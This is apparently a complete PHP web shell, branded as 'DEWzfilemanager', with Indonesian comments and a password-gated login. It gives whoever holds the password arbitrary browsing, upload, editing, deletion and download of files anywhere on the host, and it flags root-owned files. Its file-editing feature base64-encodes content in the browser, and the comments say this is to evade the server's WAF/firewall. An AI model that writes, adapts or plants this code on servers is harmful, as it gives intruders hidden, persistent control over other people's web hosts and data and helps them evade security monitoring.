<?php
/**
 * DEWzfilemanager v2.3 - Part 1 (Fixed Cookie Auth)
 */

// Hash SHA256 dari
define('PASS_HASH', 'd9987814b62db4a6d713c7bb96362e7ff911fe4682025e1df118809e53006a88'); 
define('COOKIE_NAME', 'dewz_session_gate');

// Fitur Log Out (Keluar) - Menghapus cookie
if (isset($_GET['logout'])) {
    setcookie(COOKIE_NAME, '', time() - 3600, '/');
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Proses Validasi Login menggunakan Cookie
if (isset($_POST['dewz_key'])) {
    if (hash_equals(PASS_HASH, hash('sha256', $_POST['dewz_key']))) {
        // Menyimpan status login di browser selama 1 hari
        setcookie(COOKIE_NAME, md5(PASS_HASH), time() + 86400, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Akses Ditolak: Kata Sandi Salah!";
    }
}

// Cek status validasi cookie
$is_authenticated = false;
if (isset($_COOKIE[COOKIE_NAME]) && $_COOKIE[COOKIE_NAME] === md5(PASS_HASH)) {
    $is_authenticated = true;
}

// Tampilan Form Login Modern jika belum terotentikasi
if (!$is_authenticated) {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <title>DEWzfilemanager - Sign In</title>
        <style>
            body { font-family: sans-serif; background: #121212; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-card { background: #1e1e1e; padding: 35px; border-radius: 8px; width: 300px; text-align: center; border: 1px solid #333; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
            .logo-text { background: #007acc; color: #fff; font-weight: bold; padding: 6px 12px; border-radius: 4px; font-size: 18px; display: inline-block; margin-bottom: 10px; font-family: monospace; }
            input[type="password"] { width: 90%; padding: 12px; margin: 15px 0; background: #2a2a2a; border: 1px solid #444; color: #fff; border-radius: 4px; text-align: center; font-size: 14px; }
            input[type="submit"] { background: #007acc; color: white; border: none; padding: 12px; width: 98%; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 14px; }
            input[type="submit"]:hover { background: #1177bb; }
            .err-msg { color: #ff6b6b; font-size: 13px; margin: 5px 0; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="login-card">
            <div class="logo-text">DEWz</div>
            <h3 style="margin: 5px 0 20px 0; color: #fff;">filemanager</h3>
            <?php if (isset($login_error)) echo "<p class='err-msg'>$login_error</p>"; ?>
            <form method="post" action="">
                <input type="password" name="dewz_key" placeholder="Masukkan Kata Sandi" required autofocus>
                <input type="submit" value="MASUK">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Pembacaan Direktori Aktif
$dir = isset($_GET['p']) ? realpath($_GET['p']) : realpath('.');

if ($dir === false) {
    $dir = DIRECTORY_SEPARATOR;
}

$msg = '';

// Fitur Buat File Baru
if (isset($_POST['new_file_name']) && !empty($_POST['new_file_name'])) {
    $new_file_path = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_file_name']);
    if (!file_exists($new_file_path)) {
        if (file_put_contents($new_file_path, '') !== false) {
            $msg = "<div class='alert success'>✔️ File baru berhasil dibuat.</div>";
        } else {
            $msg = "<div class='alert danger'>❌ Gagal membuat file baru.</div>";
        }
    } else {
        $msg = "<div class='alert warning'>⚠️ File sudah ada.</div>";
    }
}

// Fitur Buat Folder Baru (Directory)
if (isset($_POST['new_dir_name']) && !empty($_POST['new_dir_name'])) {
    $new_dir_path = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_dir_name']);
    if (!file_exists($new_dir_path)) {
        if (mkdir($new_dir_path, 0755)) {
            $msg = "<div class='alert success'>✔️ Folder baru berhasil dibuat.</div>";
        } else {
            $msg = "<div class='alert danger'>❌ Gagal membuat folder baru.</div>";
        }
    } else {
        $msg = "<div class='alert warning'>⚠️ Folder sudah ada.</div>";
    }
}

// Fitur Upload File
if (isset($_FILES['f_upload'])) {
    $dest = $dir . DIRECTORY_SEPARATOR . basename($_FILES['f_upload']['name']);
    if (move_uploaded_file($_FILES['f_upload']['tmp_name'], $dest)) {
        $msg = "<div class='alert success'>✔️ Sukses upload file.</div>";
    }
}

// Fitur Rename Instan via GET request
if (isset($_GET['old_name']) && isset($_GET['new_name'])) {
    $old_p = realpath($dir . DIRECTORY_SEPARATOR . $_GET['old_name']);
    $new_p = $dir . DIRECTORY_SEPARATOR . basename($_GET['new_name']);
    if ($old_p !== false && !empty($_GET['new_name'])) {
        if (rename($old_p, $new_p)) {
            $msg = "<div class='alert success'>✔️ Nama berhasil diubah.</div>";
        } else {
            $msg = "<div class='alert danger'>❌ Gagal mengubah nama.</div>";
        }
    }
}

// Fitur Simpan Edit File (Menggunakan Base64 untuk Bypass Firewall WAF 404/403)
if (isset($_POST['e_path']) && isset($_POST['e_content_b64'])) {
    $target = realpath($_POST['e_path']);
    if ($target !== false && is_file($target)) {
        $decoded_content = base64_decode($_POST['e_content_b64']);
        if (file_put_contents($target, $decoded_content) !== false) {
            $msg = "<div class='alert success'>✔️ Perubahan file berhasil disimpan.</div>";
        } else {
            $msg = "<div class='alert danger'>❌ Gagal menyimpan perubahan file.</div>";
        }
    }
}

// Fitur Hapus File atau Folder (Delete)
if (isset($_GET['del'])) {
    $del_path = realpath($_GET['del']);
    if ($del_path !== false && strpos($del_path, $dir) === 0) {
        if (is_dir($del_path)) {
            $delete_directory = function($target_dir) use (&$delete_directory) {
                $files = array_diff(scandir($target_dir), array('.', '..'));
                foreach ($files as $file) {
                    (is_dir("$target_dir/$file")) ? $delete_directory("$target_dir/$file") : unlink("$target_dir/$file");
                }
                return rmdir($target_dir);
            };
            $delete_directory($del_path);
            $msg = "<div class='alert danger'>🗑️ Folder berhasil dihapus.</div>";
        } else if (is_file($del_path)) {
            unlink($del_path);
            $msg = "<div class='alert danger'>🗑️ File berhasil dihapus.</div>";
        }
    }
}

// Fitur Unduh File (Download)
if (isset($_GET['dl'])) {
    $dl_p = realpath($_GET['dl']);
    if ($dl_p !== false && is_file($dl_p)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($dl_p).'"');
        readfile($dl_p);
        exit;
    }
}

// Membaca daftar file & folder di direktori aktif saat ini
$raw_items = array_diff(scandir($dir), array('.', '..'));

$folders = array();
$files = array();

foreach ($raw_items as $item) {
    if (is_dir($dir . DIRECTORY_SEPARATOR . $item)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

$items = array_merge($folders, $files);

// Membuat sistem navigasi klik jalur (Breadcrumbs)
$crumbs = explode(DIRECTORY_SEPARATOR, $dir);
$accumulated_path = '';
$breadcrumb_links = array();

foreach ($crumbs as $crumb) {
    if ($crumb === '') continue;
    $accumulated_path .= DIRECTORY_SEPARATOR . $crumb;
    $breadcrumb_links[] = '<a href="?p=' . urlencode($accumulated_path) . '" style="color: #4af626; font-weight: bold;">' . htmlspecialchars($crumb) . '</a>';
}
?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DEWzfilemanager</title>
    <style>
        body { font-family: sans-serif; background: #1e1e1e; color: #cfcfcf; margin: 20px; }
        a { color: #4fc1ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; font-size: 14px; }
        th { background: #252526; color: #fff; }
        tr:hover { background: #2a2a2b; }
        .card { background: #252526; padding: 15px; border-radius: 4px; margin-bottom: 15px; border: 1px solid #333; }
        
        /* Gaya Logo Brand DEWzfilemanager */
        .brand-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding: 5px; }
        .brand-logo-container { display: flex; align-items: center; gap: 12px; }
        .brand-logo { background: #007acc; color: #fff; font-weight: bold; padding: 8px 15px; border-radius: 6px; font-size: 22px; letter-spacing: 1px; box-shadow: 0 2px 8px rgba(0,122,204,0.4); font-family: 'Courier New', Courier, monospace; }
        .brand-title { font-size: 24px; font-weight: bold; color: #ffffff; margin: 0; }
        .brand-subtitle { font-size: 12px; color: #888; margin: 0; }
        .btn-logout { background: #dc3545; color: #fff; padding: 6px 12px; border-radius: 4px; font-size: 12px; font-weight: bold; text-decoration: none; }
        .btn-logout:hover { background: #bd2130; text-decoration: none; }

        .creation-container { display: flex; flex-wrap: wrap; gap: 20px; }
        .creation-box { flex: 1; min-width: 250px; }
        input[type="text"], textarea { background: #333; border: 1px solid #555; color: #fff; padding: 6px; border-radius: 4px; }
        button, input[type="submit"] { background: #007acc; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; }
        button:hover, input[type="submit"]:hover { background: #1177bb; }
        .btn-delete { color: #ff6b6b; font-weight: bold; }
        .btn-delete:hover { color: #ff4a4a; }
        .perm-write { color: #4af626; font-weight: bold; font-family: monospace; }
        .perm-read { color: #ffb74d; font-family: monospace; }
        .is-root { color: #ff4a4a; font-weight: bold; font-size: 11px; margin-left: 5px; font-family: monospace; }

        /* Notifikasi Alert */
        .alert { padding: 10px; margin-bottom: 15px; border-radius: 4px; font-weight: bold; font-size: 14px; }
        .success { background: #1e4620; color: #4af626; border: 1px solid #4af626; }
        .danger { background: #4d1c1c; color: #ff6b6b; border: 1px solid #ff6b6b; }
        .warning { background: #4d381c; color: #ffb74d; border: 1px solid #ffb74d; }

        /* GAYA POP-UP MODAL (DI TENGAH LAYAR) */
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); display: flex; justify-content: center; align-items: center; z-index: 9999; }
        .modal-box { background: #252526; border: 1px solid #444; width: 85%; max-width: 900px; padding: 20px; border-radius: 8px; box-shadow: 0 5px 25px rgba(0,0,0,0.6); position: relative; }
        .modal-box.modal-small { max-width: 450px; width: 90%; }
        .modal-title { font-size: 18px; font-weight: bold; margin-top: 0; margin-bottom: 15px; color: #fff; border-bottom: 1px solid #3c3c3c; padding-bottom: 8px; }
        .modal-footer { display: flex; justify-content: flex-end; gap: 10px; margin-top: 15px; }
        .btn-cancel { background: #444; color: #eee; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 14px; display: inline-block; }
        .btn-cancel:hover { background: #555; text-decoration: none; }
        .btn-confirm-del { background: #a1260d; color: white; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 14px; font-weight: bold; display: inline-block; }
        .btn-confirm-del:hover { background: #b51a00; text-decoration: none; }
    </style>
    <script>
        // Mengamankan teks sebelum dikirim dengan mengubahnya ke Base64 agar lolos WAF/Firewall Server
        function prepareB64Data(form) {
            var plainText = form.elements['e_content_plain'].value;
            var utf8Bytes = encodeURIComponent(plainText).replace(/%([0-9A-F]{2})/g, function(match, p1) {
                return String.fromCharCode('0x' + p1);
            });
            form.elements['e_content_b64'].value = btoa(utf8Bytes);
            form.elements['e_content_plain'].value = ""; // Kosongkan form biasa agar tidak terdeteksi firewall
            return true;
        }
    </script>
</head>

<body>

<!-- HEADER BRAND, LOGO, & LOGOUT -->
<div class="brand-header">
    <div class="brand-logo-container">
        <div class="brand-logo">DEWz</div>
        <div>
            <h1 class="brand-title">filemanager</h1>
            <p class="brand-subtitle">Secure & Free Server File Management</p>
        </div>
    </div>
    <div>
        <a href="?logout=1" class="btn-logout" onclick="return confirm('Apakah Anda yakin ingin keluar?');">Keluar</a>
    </div>
</div>

<div class="card" style="font-size: 16px; display: flex; align-items: center; gap: 8px;">
    <a href="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" style="font-size: 20px; text-decoration: none;" title="Kembali ke Awal">📁</a> 
    <span style="color: #888;">/</span> 
    <?php echo implode(' <span style="color: #888;">/</span> ', $breadcrumb_links); ?>
</div>

<?php if (!empty($msg)) echo $msg; ?>

<!-- PANEL PEMBUATAN OBJEK BARU & UPLOAD -->
<div class="card creation-container">
    <div class="creation-box">
        <h4>📄 create file</h4>
        <form method="post" action="">
            <input type="text" name="new_file_name" placeholder="name file" style="width: 60%;" required>
            <input type="submit" value="Create">
        </form>
    </div>
    <div class="creation-box">
        <h4>📁 create dir</h4>
        <form method="post" action="">
            <input type="text" name="new_dir_name" placeholder="name dir" style="width: 60%;" required>
            <input type="submit" value="Create">
        </form>
    </div>
    <div class="creation-box">
        <h4>📤 Upload File</h4>
        <form method="post" enctype="multipart/form-data" action="">
            <input type="file" name="f_upload" required>
            <input type="submit" value="Upload">
        </form>
    </div>
</div>

<div class="card">
    <h4>📁 dewzfilemanager</h4>

    <table>
        <tr>
            <th>this Objek</th>
            <th>Permissions</th>
            <th>option</th>
        </tr>
        <?php foreach ($items as $item): 
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            $is_d = is_dir($path);
            
            $perms = substr(sprintf('%o', fileperms($path)), -4);
            $is_writable = is_writable($path);
            
            $is_root_owned = false;
            if (function_exists('fileowner')) {
                $owner_uid = fileowner($path);
                if ($owner_uid === 0) {
                    $is_root_owned = true;
                }
            }
        ?>
        <tr>
            <td>
                <?php if ($is_d): ?>
                    📁 <a href="?p=<?php echo urlencode($path); ?>" style="font-weight:bold; color:#ffb74d;"><?php echo htmlspecialchars($item); ?></a>
                <?php else: ?>
                    📄 <span style="color:#fff;"><?php echo htmlspecialchars($item); ?></span>
                <?php endif; ?>
            </td>
            <td>
                <span class="<?php echo $is_writable ? 'perm-write' : 'perm-read'; ?>">
                    <?php echo $perms; ?>
                </span>
                <?php if ($is_root_owned): ?>
                    <span class="is-root">[ROOT]</span>
                <?php endif; ?>
            </td>
            <td>
                <!-- FITUR LIHAT ISI FILE (IKON MATA) -->
                <?php if (!$is_d): ?>
                    <a href="?p=<?php echo urlencode($dir); ?>&view=<?php echo urlencode($path); ?>" title="Lihat Isi File" style="font-size: 16px; margin-right: 5px;">👁️</a>
                <?php else: ?>
                    <span style="font-size: 16px; margin-right: 5px; opacity: 0.3;">👁️</span>
                <?php endif; ?>

                <a href="?p=<?php echo urlencode($dir); ?>&rename_view=<?php echo urlencode($item); ?>" style="color: #62a3ff; font-weight: bold;">✏️ Rename</a>
                
                <?php if (!$is_d): ?>
                    | <a href="?p=<?php echo urlencode($dir); ?>&edit=<?php echo urlencode($path); ?>">📝 Edit</a>
                    | <a href="?dl=<?php echo urlencode($path); ?>">📥 Unduh</a>
                <?php endif; ?>

                | <a href="?p=<?php echo urlencode($dir); ?>&delete_view=<?php echo urlencode($item); ?>&target_path=<?php echo urlencode($path); ?>" class="btn-delete">🗑️ Delete</a>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>
</div>

<!-- POP-UP MODAL DI TENGAH LAYAR UNTUK RENAME -->
<?php 
if (isset($_GET['rename_view'])): 
    $target_rename = $_GET['rename_view'];
?>
<div class="modal-overlay">
    <div class="modal-box modal-small">
        <div class="modal-title">✏️ Ganti Nama Objek</div>
        <form method="get" action="">
            <input type="hidden" name="p" value="<?php echo htmlspecialchars($dir); ?>">
            <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($target_rename); ?>">
            <p style="font-size: 14px; margin-bottom: 10px;">Nama Lama: <code style="color: #ffb74d;"><?php echo htmlspecialchars($target_rename); ?></code></p>
            <input type="text" name="new_name" value="<?php echo htmlspecialchars($target_rename); ?>" style="width: 100%; box-sizing: border-box; font-size: 14px; padding: 8px;" required autofocus>
            <div class="modal-footer">
                <input type="submit" value="Rename">
                <a href="?p=<?php echo urlencode($dir); ?>" class="btn-cancel">❌ Batal</a>
            </div>
        </form>
    </div>
</div>
<?php endif; ?>

<!-- POP-UP MODAL DI TENGAH LAYAR UNTUK CONFIRM DELETE -->
<?php 
if (isset($_GET['delete_view']) && isset($_GET['target_path'])): 
    $del_name = $_GET['delete_view'];
    $del_target_path = $_GET['target_path'];
?>
<div class="modal-overlay">
    <div class="modal-box modal-small" style="border-color: #ff6b6b;">
        <div class="modal-title" style="color: #ff6b6b;">🗑️ Konfirmasi Penghapusan</div>
        <p style="font-size: 14px; margin-bottom: 20px; line-height: 1.5;">
            Apakah Anda yakin ingin menghapus objek ini secara permanen dari server?<br><br>
            Nama: <code style="color: #ffb74d; font-weight: bold;"><?php echo htmlspecialchars($del_name); ?></code>
        </p>
        <div class="modal-footer">
            <a href="?p=<?php echo urlencode($dir); ?>&del=<?php echo urlencode($del_target_path); ?>" class="btn-confirm-del">Ya, Hapus</a>
            <a href="?p=<?php echo urlencode($dir); ?>" class="btn-cancel">Batal</a>
        </div>
    </div>
</div>
<?php endif; ?>

<!-- POP-UP MODAL DI TENGAH LAYAR UNTUK HANYA LIHAT ISI FILE (VIEW MODE) -->
<?php 
if (isset($_GET['view'])): 
    $v_target = realpath($_GET['view']);
    if ($v_target !== false && is_file($v_target)):
        $v_content = file_get_contents($v_target);
?>
<div class="modal-overlay">
    <div class="modal-box">
        <div class="modal-title">👁️ Melihat Isi File: <span style="color:#ffb74d;"><?php echo htmlspecialchars(basename($v_target)); ?></span></div>
        <textarea readonly rows="22" style="width:98%; font-family: monospace; font-size: 14px; background:#111; color:#aaa; padding:10px; box-sizing: border-box; resize: vertical;"><?php echo htmlspecialchars($v_content); ?></textarea>
        <div class="modal-footer">
            <a href="?p=<?php echo urlencode($dir); ?>" class="btn-cancel">❌ Tutup</a>
        </div>
    </div>
</div>
<?php endif; endif; ?>

<!-- POP-UP MODAL DI TENGAH LAYAR UNTUK EDIT FILE (ENKRIPSI BASE64 UNTUK BYPASS FIREWALL) -->
<?php 
if (isset($_GET['edit'])): 
    $e_target = realpath($_GET['edit']);
    if ($e_target !== false && is_file($e_target)):
        $content = file_get_contents($e_target);
?>
<div class="modal-overlay">
    <div class="modal-box">
        <div class="modal-title">📝 Mengedit File: <span style="color:#4fc1ff;"><?php echo htmlspecialchars(basename($e_target)); ?></span></div>
        <form method="post" action="?p=<?php echo urlencode($dir); ?>" onsubmit="return prepareB64Data(this);">
            <input type="hidden" name="e_path" value="<?php echo htmlspecialchars($e_target); ?>">
            <input type="hidden" name="e_content_b64" value="">
            <textarea name="e_content_plain" rows="22" style="width:98%; font-family: monospace; font-size: 14px; background:#111; color:#fff; padding:10px; box-sizing: border-box; resize: vertical;"><?php echo htmlspecialchars($content); ?></textarea>
            <div class="modal-footer">
                <input type="submit" value="Simpan Perubahan">
                <a href="?p=<?php echo urlencode($dir); ?>" class="btn-cancel">❌ Batal</a>
            </div>
        </form>
    </div>
</div>
<?php endif; endif; ?>

</body>
</html>
